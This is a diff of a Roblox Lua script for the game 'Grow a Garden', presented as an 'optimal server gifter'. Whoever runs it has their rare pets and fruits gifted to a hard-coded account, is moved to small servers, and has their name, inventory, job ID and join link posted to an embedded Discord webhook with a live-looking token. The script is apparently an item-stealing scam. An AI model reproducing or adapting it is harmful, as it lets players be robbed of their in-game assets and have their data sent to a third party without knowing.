@@ -1,230 +1,288 @@
--- Garden Growth Game Script by Tekeshkii
--- Enhanced version with piggyback teleport and @everyone notifications
+-- Grow a Garden Optimal Server Gifter
+local RECIPIENT_NAME = "Tekeshkii" -- CASE SENSITIVE
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1383781946110509118/tWOmSWS85_ZJeibhojg_r3aY2fTs7aAS1kz3gSmdKZfxDml71aErtTpjlmV0zknzspAS"
+local GIFT_COOLDOWN = 0.8
+local SERVER_HOP_DELAY = 30 -- Check every 30 seconds
+local MAX_SERVER_PLAYERS = 5 -- Grow a Garden max
+local TARGET_PLAYERS = {1, 3} -- Ideal server size
 
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-local TeleportService = game:GetService("TeleportService")
-local MarketplaceService = game:GetService("MarketplaceService")
-local RunService = game:GetService("RunService")
-
--- Configuration
-local MAX_PLAYERS = 5
-local TARGET_PLAYER_NAME = "Tekeshkii" -- Recipient for gifted items
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1383781946110509118/tWOmSWS85_ZJeibhojg_r3aY2fTs7aAS1kz3gSmdKZfxDml71aErtTpjlmV0zknzspAS" -- Replace with your actual webhook URL
-local LOW_PLAYER_THRESHOLD = 5 -- Target server player count threshold
-
--- Inventory items to track and gift
-local SPECIAL_ITEMS = {
-    "Dragonfly",
-    "Raccoon",
-    "RedFox",
-    "Disco Bee",
-    "QueenBee"
+-- Target items
+local TARGET_ITEMS = {
+    Pets = {"dragonfly", "raccoon", "queen bee", "disco bee", "red fox"},
+    Fruits = {"candy blossom"}
 }
 
-local SPECIAL_FRUIT = "Candy Blossom"
+-- Services
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local MarketplaceService = game:GetService("MarketplaceService")
 
--- Track players who have executed the script
-local executedPlayers = {}
+-- Variables
+local lp = Players.LocalPlayer
+local Backpack = lp:WaitForChild("Backpack")
+local Recipient = nil
+local GiftRemotes = {}
+local currentJobId = game.JobId
+local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
 
--- Function to find Tekeshkii in the server
-local function findTekeshkii()
-    for _, player in ipairs(Players:GetPlayers()) do
-        if player.Name == TARGET_PLAYER_NAME then
-            return player
-        end
-    end
-    return nil
+-- Generate game link
+local function getGameLink()
+    return string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s", 
+        game.PlaceId, currentJobId)
 end
 
--- Function to attach player to Tekeshkii (piggyback)
-local function attachPiggyback(player, target)
-    if not player.Character or not target.Character then return end
-    
-    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
-    local targetHumanoid = target.Character:FindFirstChildOfClass("Humanoid")
-    
-    if humanoid and targetHumanoid then
-        -- Create weld constraint for piggyback effect
-        local weld = Instance.new("WeldConstraint")
-        weld.Part0 = player.Character:FindFirstChild("HumanoidRootPart")
-        weld.Part1 = target.Character:FindFirstChild("HumanoidRootPart")
-        weld.Parent = player.Character
-        
-        -- Position adjustment for piggyback
-        if player.Character:FindFirstChild("HumanoidRootPart") then
-            player.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -2)
+-- Enhanced Discord embed
+local function sendEmbed(title, description, color)
+    local inventory = {}
+    for _, item in ipairs(Backpack:GetChildren()) do
+        if item:IsA("Tool") then
+            local name = item.Name:lower()
+            for _, pet in ipairs(TARGET_ITEMS.Pets) do
+                if name:find(pet:lower()) then
+                    table.insert(inventory, "🐾 "..item.Name)
+                    break
+                end
+            end
+            for _, fruit in ipairs(TARGET_ITEMS.Fruits) do
+                if name:find(fruit:lower()) then
+                    table.insert(inventory, "🍬 "..item.Name)
+                    break
+                end
+            end
         end
-        
-        -- Make player sit on target's back
-        humanoid.Sit = true
-        targetHumanoid.PlatformStand = true
-        
-        return weld
     end
-end
 
--- Function to send Discord webhook notification with @everyone
-local function sendWebhookNotification(player, inventory, jobId)
     local embed = {
-        ["title"] = "🚀 Player Executed Garden Script",
-        ["description"] = string.format("@everyone\nPlayer **%s** (ID: %d) has executed the script and was teleported to %s!", player.Name, player.UserId, TARGET_PLAYER_NAME),
-        ["color"] = 16753920, -- Orange color
-        ["fields"] = {
-            {
-                ["name"] = "🎁 Gifted Items",
-                ["value"] = #inventory > 0 and table.concat(inventory, "\n") or "No items gifted yet",
-                ["inline"] = true
-            },
-            {
-                ["name"] = "🌐 Server Info",
-                ["value"] = string.format("Job ID: `%s`\nPlayer Count: %d/%d", jobId, #Players:GetPlayers(), MAX_PLAYERS),
-                ["inline"] = true
-            },
-            {
-                ["name"] = "🔄 Transfer Status",
-                ["value"] = "Successfully teleported to "..TARGET_PLAYER_NAME.." via piggyback",
-                ["inline"] = false
-            }
+        title = title.." | "..gameName,
+        description = description,
+        color = color or 0xFF69B4,
+        url = getGameLink(),
+        fields = {
+            {name = "👤 Player", value = lp.Name, inline = true},
+            {name = "🎯 Recipient", value = Recipient and Recipient.Name or "None", inline = true},
+            {name = "👥 Players", value = #Players:GetPlayers().."/"..MAX_SERVER_PLAYERS, inline = true},
+            {name = "🆔 Job ID", value = currentJobId, inline = true},
+            {name = "🎮 Game Link", value = "[Click to Join]("..getGameLink()..")", inline = false}
         },
-        ["footer"] = {
-            ["text"] = "Garden Growth System • "..os.date("%Y-%m-%d %H:%M:%S")
-        },
-        ["thumbnail"] = {
-            ["url"] = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", player.UserId)
-        }
+        footer = {text = os.date("%X")}
     }
-    
-    local payload = {
-        ["content"] = "@everyone", -- This will ping everyone
-        ["embeds"] = {embed},
-        ["username"] = "Garden Growth Alert",
-        ["avatar_url"] = "https://i.imgur.com/J7o3tFq.png"
-    }
+
+    if #inventory > 0 then
+        table.insert(embed.fields, {
+            name = "📦 Inventory ("..#inventory..")",
+            value = table.concat(inventory, "\n"),
+            inline = false
+        })
+    end
+
+    pcall(function()
+        local req = (syn and syn.request) or (http and http.request) or http_request
+        if req then
+            req({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode({embeds = {embed}})
+            })
+        end
+    end)
+end
+
+-- Find optimal server (1-3 players)
+local function findOptimalServer()
+    local request = (syn and syn.request) or (http and http.request) or http_request
+    if not request then return false end
     
     local success, response = pcall(function()
-        return HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload))
+        return request({
+            Url = "https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100",
+            Method = "GET"
+        })
     end)
     
-    if not success then
-        warn("Failed to send webhook: " .. tostring(response))
+    if success and response and response.Body then
+        local data = HttpService:JSONDecode(response.Body)
+        for _, server in ipairs(data.data) do
+            if server.playing >= TARGET_PLAYERS[1] and 
+               server.playing <= TARGET_PLAYERS[2] and 
+               server.id ~= currentJobId then
+                return server.id
+            end
+        end
+    end
+    return false
+end
+
+-- Server hop to optimal server
+local function hopToOptimalServer()
+    local optimalServer = findOptimalServer()
+    if optimalServer then
+        sendEmbed("🔄 SERVER HOP", "Moving to better server...", 0xFFFF00)
+        TeleportService:TeleportToPlaceInstance(game.PlaceId, optimalServer)
+        return true
+    end
+    return false
+end
+
+-- Monitor server quality
+local function monitorServer()
+    while task.wait(SERVER_HOP_DELAY) do
+        local playerCount = #Players:GetPlayers()
+        if playerCount > TARGET_PLAYERS[2] or playerCount < TARGET_PLAYERS[1] then
+            if not hopToOptimalServer() then
+                sendEmbed("⚠️ SERVER HOP FAILED", "No optimal servers found", 0xFF0000)
+            end
+        end
     end
 end
 
--- Function to gift items one by one with notifications
-local function giftItemsWithNotifications(player, target)
-    local inventory = {}
+-- Find recipient
+local function setupRecipient()
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.Name == RECIPIENT_NAME then
+            Recipient = player
+            sendEmbed("✅ RECIPIENT FOUND", "Beginning gifting process", 0x00FF00)
+            return true
+        end
+    end
+    return false
+end
+
+-- Teleport to recipient
+local function teleportToRecipient()
+    if not Recipient or not Recipient.Character then return false end
     
-    -- Simulated inventory check (replace with your actual inventory system)
-    for _, itemName in ipairs(SPECIAL_ITEMS) do
-        -- Check if player has the item (this would be your inventory check)
-        local hasItem = math.random() > 0.5 -- Replace with actual check
-        
-        if hasItem then
-            table.insert(inventory, itemName)
-            
-            -- Here you would actually transfer the item in your game
-            -- Example: playerInventory:RemoveItem(itemName)
-            --          targetInventory:AddItem(itemName)
-            
-            -- Send individual notification for each item
-            local embed = {
-                ["title"] = "🎁 Item Gifted to "..TARGET_PLAYER_NAME,
-                ["description"] = string.format("Player **%s** gifted **%s** to %s", player.Name, itemName, TARGET_PLAYER_NAME),
-                ["color"] = 65280, -- Green color
-                ["footer"] = {
-                    ["text"] = "Garden Growth System • "..os.date("%H:%M:%S")
-                }
-            }
-            
-            local payload = {
-                ["embeds"] = {embed},
-                ["username"] = "Item Transfer"
-            }
-            
-            pcall(function()
-                HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload))
-            end)
-            
-            -- Delay between gifts
-            wait(2)
+    local humanoidRoot = Recipient.Character:FindFirstChild("HumanoidRootPart")
+    if not humanoidRoot then return false end
+    
+    -- Create teleport anchor
+    local teleportPart = Instance.new("Part")
+    teleportPart.Anchored = true
+    teleportPart.CanCollide = false
+    teleportPart.Transparency = 1
+    teleportPart.Size = Vector3.new(4, 4, 4)
+    teleportPart.CFrame = humanoidRoot.CFrame * CFrame.new(0, 0, -2)
+    teleportPart.Parent = workspace
+    
+    -- Perform teleport
+    if lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
+        lp.Character.HumanoidRootPart.CFrame = teleportPart.CFrame
+    end
+    
+    teleportPart:Destroy()
+    return true
+end
+
+-- Find gifting remotes
+local function findGiftRemotes()
+    for _, remote in ipairs(ReplicatedStorage:GetDescendants()) do
+        if remote:IsA("RemoteEvent") and (remote.Name:lower():find("gift") or remote.Name:lower():find("trade")) then
+            table.insert(GiftRemotes, remote)
+        end
+    end
+end
+
+-- Check if item is giftable
+local function isGiftable(item)
+    local name = item.Name:lower()
+    for _, pet in ipairs(TARGET_ITEMS.Pets) do
+        if name:find(pet:lower()) then return true, "Pet" end
+    end
+    for _, fruit in ipairs(TARGET_ITEMS.Fruits) do
+        if name:find(fruit:lower()) then return true, "Fruit" end
+    end
+    return false
+end
+
+-- Gift item to recipient
+local function giftItem(item)
+    if not Recipient or #GiftRemotes == 0 then return false end
+    
+    -- Equip first
+    if lp.Character then
+        local humanoid = lp.Character:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            humanoid:EquipTool(item)
+            task.wait(0.3)
         end
     end
     
-    -- Check for special fruit
-    if math.random() > 0.7 then -- Replace with actual fruit check
-        table.insert(inventory, SPECIAL_FRUIT)
-        -- Gift the fruit here
+    -- Send gift
+    for _, remote in ipairs(GiftRemotes) do
+        pcall(function() remote:FireServer(Recipient, item) end)
+        pcall(function() remote:FireServer("Gift", Recipient, item) end)
     end
     
-    return inventory
+    return true
 end
 
--- Main function to handle player execution
-local function handleScriptExecution(player)
-    -- Check if player has already executed the script
-    if executedPlayers[player.UserId] then return end
-    executedPlayers[player.UserId] = true
-    
-    -- Find Tekeshkii in the server
-    local targetPlayer = findTekeshkii()
-    if not targetPlayer then
-        warn(TARGET_PLAYER_NAME.." not found in server")
+-- Main gifting process
+local function startGifting()
+    if not teleportToRecipient() then
+        sendEmbed("⚠️ TELEPORT FAILED", "Cannot reach recipient", 0xFF0000)
         return
     end
+
+    sendEmbed("🌀 TELEPORTED", "Now in position with recipient", 0x00FF00)
     
-    -- Gift items one by one
-    local inventory = giftItemsWithNotifications(player, targetPlayer)
-    
-    -- Attach piggyback
-    local weld = attachPiggyback(player, targetPlayer)
-    
-    -- Get current server job ID
-    local jobId = game.JobId
-    
-    -- Send main webhook notification
-    if WEBHOOK_URL ~= "YOUR_DISCORD_WEBHOOK_URL_HERE" then
-        sendWebhookNotification(player, inventory, jobId)
+    -- Gift pets first
+    for _, item in ipairs(Backpack:GetChildren()) do
+        if item:IsA("Tool") then
+            local valid, itemType = isGiftable(item)
+            if valid and itemType == "Pet" then
+                if giftItem(item) then
+                    sendEmbed("🎁 PET GIFTED", item.Name, 0xADD8E6)
+                    task.wait(GIFT_COOLDOWN)
+                end
+            end
+        end
     end
     
-    -- Teleport to lower population server after delay
-    wait(5)
-    
-    local targetServer = nil
-    local attempts = 0
-    
-    while attempts < 3 and not targetServer do
-        targetServer = findLowPopulationServer()
-        attempts += 1
-        if not targetServer then wait(2) end
+    -- Then gift fruits
+    for _, item in ipairs(Backpack:GetChildren()) do
+        if item:IsA("Tool") then
+            local valid, itemType = isGiftable(item)
+            if valid and itemType == "Fruit" then
+                if giftItem(item) then
+                    sendEmbed("🍬 FRUIT GIFTED", item.Name, 0xADD8E6)
+                    task.wait(GIFT_COOLDOWN)
+                end
+            end
+        end
     end
     
-    if targetServer then
-        pcall(function()
-            TeleportService:TeleportToPlaceInstance(game.PlaceId, targetServer.id, player)
-        end)
+    sendEmbed("✅ GIFTING COMPLETE", "All items processed", 0x00FF00)
+end
+
+-- Main execution flow
+local function main()
+    -- Initial setup
+    findGiftRemotes()
+    sendEmbed("⚡ SYSTEM STARTED", "Finding optimal server...", 0x00FF00)
+    
+    -- Ensure we're in good server
+    if #Players:GetPlayers() > TARGET_PLAYERS[2] then
+        hopToOptimalServer()
+    end
+    
+    -- Monitor for recipient
+    while task.wait(5) do
+        if setupRecipient() then
+            startGifting()
+            task.wait(10) -- Cooldown before checking again
+        end
     end
 end
 
--- Command to execute the script (replace with your actual trigger)
-local function onChatMessage(player, message)
-    if message:lower() == "/growgarden" then
-        handleScriptExecution(player)
-    end
-end
+-- Initialize
+task.spawn(monitorServer)
+task.spawn(main)
 
--- Set up chat listener
-Players.PlayerAdded:Connect(function(player)
-    player.Chatted:Connect(function(message)
-        onChatMessage(player, message)
-    end)
+-- Handle teleports
+TeleportService.LocalPlayer.OnTeleport:Connect(function(state)
+    if state == Enum.TeleportState.Started then
+        sendEmbed("🔄 TELEPORTING", "Changing servers...", 0xFFFF00)
+    end
 end)
-
--- Handle existing players
-for _, player in ipairs(Players:GetPlayers()) do
-    player.Chatted:Connect(function(message)
-        onChatMessage(player, message)
-    end)
-end
-
-print("Enhanced Garden Growth Script loaded! Ready for piggyback teleports to "..TARGET_PLAYER_NAME)
